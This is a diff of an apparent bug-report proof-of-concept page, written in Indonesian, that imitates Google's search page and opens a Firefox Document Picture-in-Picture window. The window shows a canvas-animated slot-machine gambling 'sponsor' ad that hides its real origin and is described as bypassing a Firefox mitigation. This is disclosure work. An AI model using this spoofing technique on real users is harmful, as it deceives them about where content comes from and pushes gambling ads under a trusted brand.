@@ -24,74 +24,105 @@
 </style>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PoC Mozilla Desktop - PiP Sponsored Gambling Spoof</title>
+<title>PoC Final - Mozilla Desktop PiP Origin Missing - GIF Model</title>
 <style>
  body{font-family:sans-serif;padding:0;margin:0;background:#fff}
- .google{max-width:600px;margin:60px auto;text-align:center;padding:20px}
- .logo{font-size:52px;margin-bottom:20px}
- .logo b{font-weight:400}
- .search{border:1px solid #dfe1e5;border-radius:24px;padding:12px 20px;display:flex;align-items:center;gap:10px;box-shadow:0 1px 3px rgba(0,0,0,.1)}
- .search input{border:0;outline:0;flex:1;font-size:16px}
- .note{background:#e7f3ff;border:1px solid #2196F3;padding:10px;margin:12px auto;max-width:600px;border-radius:6px;font-size:13px}
- button{font-size:15px;padding:12px 20px;border-radius:6px;cursor:pointer;background:#1a73e8;color:#fff;border:0}
+ .google{max-width:600px;margin:40px auto;text-align:center;padding:20px}
+ .logo{font-size:46px;margin-bottom:10px}
+ .search{border:1px solid #dfe1e5;border-radius:24px;padding:12px 18px;display:flex;align-items:center;gap:10px;margin:18px 0;box-shadow:0 1px 3px rgba(0,0,0,.1)}
+ .search input{border:0;outline:0;flex:1;font-size:15px}
+ .note{background:#e8f5e9;border:1px solid #4caf50;padding:12px;margin:12px auto;max-width:600px;border-radius:6px;font-size:12px;text-align:left}
+ button.main{font-size:15px;padding:14px 22px;border-radius:8px;background:#1a73e8;color:#fff;border:0;cursor:pointer;font-weight:bold}
+ code{background:#eee;padding:2px 6px}
 </style>
 </head>
 <body>
 
 <div class="google">
  <div class="logo"><b style="color:#4285F4">G</b><b style="color:#EA4335">o</b><b style="color:#FBBC05">o</b><b style="color:#4285F4">g</b><b style="color:#34A853">l</b><b style="color:#EA4335">e</b></div>
- <div class="search"><span>🔍</span><input value="berita hari ini" readonly><span>🎤</span></div>
- <p style="font-size:12px;color:#555;margin-top:20px">Halaman ini terlihat seperti google.com (simulasi trusted site)</p>
- <button onclick="openPiP()">▶ Putar Video (Picu PiP)</button>
+ <div class="search"><span>🔍</span><input value="highlight bola tadi malam" readonly><span>🎤</span></div>
+ <button class="main" onclick="openPiP()">▶ Tonton di PiP</button>
+ <p style="font-size:11px;color:#777;margin-top:10px">Halaman ini mensimulasikan google.com (trusted site) - Fokus Mozilla Desktop Only</p>
 </div>
 
-<div class="note"><b>PoC Fokus Mozilla Desktop - Tanpa sebut Chrome</b><br>
-Halaman induk terlihat seperti Google. Saat user klik, PiP terbuka berisi konten SPONSOR JUDI (milik attacker). Di Firefox Desktop, PiP <b>tidak menampilkan origin asli</b>, jadi user mengira sponsor judi ini berasal dari Google / difasilitasi browser, padahal dari <code id="orig"></code></div>
+<div class="note">
+<b>FINAL PoC - Model GIF Tanpa Tombol (Bypass Mitigasi Firefox)</b><br>
+Bug: Document PiP di Firefox Desktop tidak menampilkan origin jika kontennya non-interaktif.<br>
+Real origin: <code id="orig"></code> (harusnya tampil di header PiP, tapi tidak)<br>
+Claimed: google.com - Video highlight dengan sponsor judi (model GIF animasi)<br>
+Impact: User mengira sponsor judi ini berasal dari Google, padahal dari attacker. Firefox memfasilitasi unwanted gambling content injection.
+</div>
 
 <script>
 document.getElementById('orig').textContent = location.origin;
 
 async function openPiP(){
  if(!('documentPictureInPicture' in window)){
-  alert('Browser tidak support Document PiP API - coba Firefox 130+ Desktop');
+  alert('Browser tidak support Document PiP - gunakan Firefox 130+ Desktop');
   return;
  }
  try{
-  const pip = await documentPictureInPicture.requestWindow({width:400,height:380});
+  const pip = await documentPictureInPicture.requestWindow({width:420,height:400});
   pip.document.write(`
-   <html><head><title>Google - Video</title>
+   <html><head><title>Google - Highlight Bola</title>
+   <meta charset="utf-8">
    <style>
-    body{margin:0;font-family:sans-serif;background:#000;color:#fff;overflow:hidden}
-    .top{padding:6px 10px;background:#111;font-size:11px;color:#ff6b6b}
-    .wrap{position:relative;width:100%;height:230px;background:#000}
-    video{width:100%;height:100%;object-fit:cover}
-    .ad{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent, rgba(0,0,0,0.95));padding:30px 12px 12px 12px;pointer-events:none}
-    .ad button{pointer-events:auto}
-    .badge{background:#ffcc00;color:#000;padding:2px 6px;border-radius:3px;font-size:10px;font-weight:bold}
-    .cta{background:#00c853;color:#fff;border:0;padding:8px 14px;border-radius:4px;font-weight:bold;margin-top:8px;cursor:pointer}
+    body{margin:0;background:#000;color:#fff;font-family:sans-serif;overflow:hidden}
+    .wrap{position:relative;width:100%;height:300px;background:#000}
+    canvas{width:100%;height:100%;display:block}
+    .ad{position:absolute;left:0;right:0;bottom:0;background:linear-gradient(transparent, rgba(0,0,0,0.96));padding:40px 12px 14px 12px}
+    .badge{background:#ffcc00;color:#000;padding:3px 7px;border-radius:4px;font-size:10px;font-weight:bold;letter-spacing:0.5px}
+    .title{font-size:18px;font-weight:800;margin-top:6px;line-height:1.2;text-shadow:0 1px 2px rgba(0,0,0,0.8)}
+    .sub{font-size:11px;color:#ddd;margin-top:4px}
+    .cta{margin-top:10px;background:#00e676;color:#000;padding:9px 14px;border-radius:6px;font-weight:800;font-size:13px;display:inline-block}
+    .top-label{position:absolute;top:0;left:0;right:0;background:rgba(0,0,0,0.6);padding:5px 8px;font-size:9px;color:#ff8a80;z-index:10;font-family:monospace}
    </style></head><body>
-    <div class=top>⚠ REAL ORIGIN: ${location.origin} - CLAIMED: google.com - tidak terlihat di header Firefox</div>
     <div class=wrap>
-     <video id="v" autoplay muted loop playsinline controls crossorigin="anonymous" src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4"></video>
+     <div class=top-label>PoC: REAL=${location.origin} | CLAIMED=google.com | Tanpa <button> jadi origin tidak muncul di Firefox</div>
+     <canvas id="c" width="420" height="300"></canvas>
      <div class=ad>
-      <span class=badge>SPONSORED</span>
-      <div style="font-size:16px;font-weight:bold;margin-top:4px">SLOT GACOR 2026 - BONUS 100%</div>
-      <div style="font-size:11px;color:#ccc;margin-top:2px">Simulasi iklan judi sebagai sponsor video - klik untuk klaim</div>
-      <button class=cta onclick="alert('PoC: Jika ini iklan judi beneran, user akan mengira ini dari Google karena PiP tidak menampilkan origin.')">DAFTAR SEKARANG →</button>
+      <span class=badge>SPONSORED • LIVE • GIF AD</span>
+      <div class=title>SLOT GACOR 2026 - MAXWIN x1000 HARI INI</div>
+      <div class=sub>Bonus New Member 100% • Depo 25rb • Model animasi GIF tanpa elemen interaktif</div>
+      <div class=cta>▶ KLAIM BONUS SEKARANG</div>
+      <div style="font-size:9px;color:#aaa;margin-top:8px">google.com • Video • Sponsor - SECURITY PoC ONLY</div>
      </div>
     </div>
-    <div style="padding:8px;background:#fff;color:#000;font-size:11px">
-     <b>google.com</b> - Video | User mengira sponsor judi ini dari Google, karena PiP Firefox tidak menampilkan origin asli <b>${location.origin}</b><br>
-     <span style="font-size:9px;color:#999">SECURITY PoC ONLY - Video sample BigBuckBunny + overlay sponsor simulasi. Tidak ada link judi aktif.</span>
-    </div>
     <script>
-     const vid=document.getElementById('v');
-     vid.play().catch(()=>{});
+     const c=document.getElementById('c'); const x=c.getContext('2d'); let f=0;
+     function draw(){
+       f++;
+       x.fillStyle='#0a0a0a'; x.fillRect(0,0,420,300);
+       // Background grid animasi GIF
+       x.fillStyle='rgba(255,255,255,0.03)';
+       for(let i=0;i<420;i+=20){ x.fillRect(i,0,1,300); }
+       for(let j=0;j<300;j+=20){ x.fillRect(0,j,420,1); }
+       // 3 reel slot animasi
+       const sym=['7','BAR','★','$','🍒'];
+       const col=['#ffcc00','#00e676','#ff1744','#2979ff'];
+       for(let k=0;k<3;k++){
+         const cx=70+k*115; const cy=110+Math.sin(f/8+k)*6;
+         x.fillStyle=col[(f+k)%4]; x.fillRect(cx, cy, 90, 110);
+         x.fillStyle='#000'; x.fillRect(cx+4, cy+4, 82, 102);
+         x.fillStyle='#fff'; x.font='bold 28px sans-serif'; x.textAlign='center';
+         const s=sym[(f+k*2)%5]; x.fillText(s, cx+45, cy+68);
+         // win line
+         if(f%30<15){ x.fillStyle='rgba(255,204,0,0.8)'; x.fillRect(cx, cy+50, 90, 3); }
+       }
+       // particle coins
+       x.fillStyle='#ffcc00'; x.font='16px sans-serif';
+       for(let p=0;p<5;p++){
+         const px=(f*2+p*80)%420; const py=30+Math.sin(f/10+p)*20;
+         x.fillText('💰', px, py);
+       }
+       requestAnimationFrame(draw);
+     }
+     draw();
     <\/script>
    </body></html>
   `);
   pip.document.close();
- }catch(e){ alert('Gagal: '+e); }
+ }catch(e){ alert('Error: '+e); }
 }
 </script>
 <script>(function(){var loc=location.href.replace(/#.*$/,"");var ATTR_NAMES=["data-product-id","data-productid","data-product_id","product-id","productid","product_id","data-source-entity-id","source-entity-id","source_entity_id","data-product","data-metadata","data-meta"];var DATASET_KEYS=["productId","productid","product_id","sourceEntityId","sourceentityid","source_entity_id","product","metadata","meta"];function readProductId(value){if(typeof value!=="string"||value.length===0)return null;if(/^[0-9]{6,}$/.test(value))return value;var match=value.match(/(?:product(?:_|-)?id|source(?:_|-)?entity(?:_|-)?id)["'=:\s]+([0-9]{6,})/i);return match?match[1]:null}function extractProductId(start){for(var node=start;node&&node!==document.body;node=node.parentElement){for(var i=0;i<ATTR_NAMES.length;i++){var attrValue=node.getAttribute&&node.getAttribute(ATTR_NAMES[i]);var attrProductId=readProductId(attrValue);if(attrProductId)return attrProductId}var dataset=node.dataset||null;if(dataset){for(var j=0;j<DATASET_KEYS.length;j++){var dataValue=dataset[DATASET_KEYS[j]];var dataProductId=readProductId(dataValue);if(dataProductId)return dataProductId}}}return null}function isInlineMediaSlotElement(node){return !!(node&&node.getAttribute&&node.getAttribute("data-clippy-inline-media-slot")!==null)}function findInlineMediaSlot(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(isInlineMediaSlotElement(node))return node}return null}function readInlineMediaUrl(node){if(!node)return null;return node.getAttribute&&((node.getAttribute("data-clippy-inline-media-url")||node.getAttribute("data-url")||node.getAttribute("data_url")))||node.href||null}function stripHash(url){return String(url).replace(/#.*$/,"")}function urlsMatch(a,b){if(!a||!b)return false;try{return stripHash(new URL(a,loc).href)===stripHash(new URL(b,loc).href)}catch(_){return stripHash(a)===stripHash(b)}}function isFirstPartyReelUrl(value){try{var url=new URL(value,loc);if(url.protocol!=="https:")return false;var host=url.hostname.toLowerCase();var supported=host==="instagram.com"||host.endsWith(".instagram.com")||host==="facebook.com"||host.endsWith(".facebook.com");return supported&&/\/reels?\//i.test(url.pathname)}catch(_){return false}}function isInlineMediaUrlClick(node,href){var slot=findInlineMediaSlot(node);if(!slot)return false;var slotUrl=readInlineMediaUrl(slot);if(slotUrl)return urlsMatch(href,slotUrl);return isFirstPartyReelUrl(href)}function findDataHref(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(node.getAttribute){var href=node.getAttribute("data-href")||node.getAttribute("data-url");if(href)return{href:href,node:node}}}return null}var nativeOpen=window.open;window.open=function(url){if(parent!==window&&typeof url==="string"&&/^https?:\/\//.test(url)){parent.postMessage({type:"ecto:usercontent-link-click",href:url},"*");return null}return nativeOpen?nativeOpen.apply(window,arguments):null};document.addEventListener("click",function(e){var target=e.target instanceof Element?e.target:null;if(!target)return;if(parent===window)return;var a=target.closest?target.closest("a[href]"):null;if(a&&a.href&&/^https?:\/\//.test(a.href)&&a.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(a,a.href))return;var productId=extractProductId(target)||extractProductId(a);if(productId){e.preventDefault();parent.postMessage({type:"ecto-artifact-link-click",productId:productId},"*");return}e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:a.href},"*");return}var dataHref=findDataHref(target);if(dataHref&&/^https?:\/\//.test(dataHref.href)&&dataHref.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(dataHref.node,dataHref.href))return;e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:dataHref.href},"*")}},true)})();</script><script>(function(){var FOCUS_TYPE="ecto:artifact-focus-request";var CLOSE_TYPE="ecto:artifact-close-request";function focusArtifactDocument(){var body=document.body;if(!body)return;try{window.focus();}catch(e){}if(!body.hasAttribute("tabindex"))body.setAttribute("tabindex","-1");try{body.focus({preventScroll:true});}catch(e){try{body.focus();}catch(e2){}}}window.addEventListener("message",function(event){if(event.source!==window.parent)return;var data=event.data;if(!data||typeof data!=="object"||data.type!==FOCUS_TYPE)return;if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",focusArtifactDocument,{once:true});return;}focusArtifactDocument();});window.addEventListener("keydown",function(event){if(event.key!=="Escape")return;window.setTimeout(function(){if(event.defaultPrevented)return;window.parent.postMessage({type:CLOSE_TYPE},"*");},0);});})();</script></body>
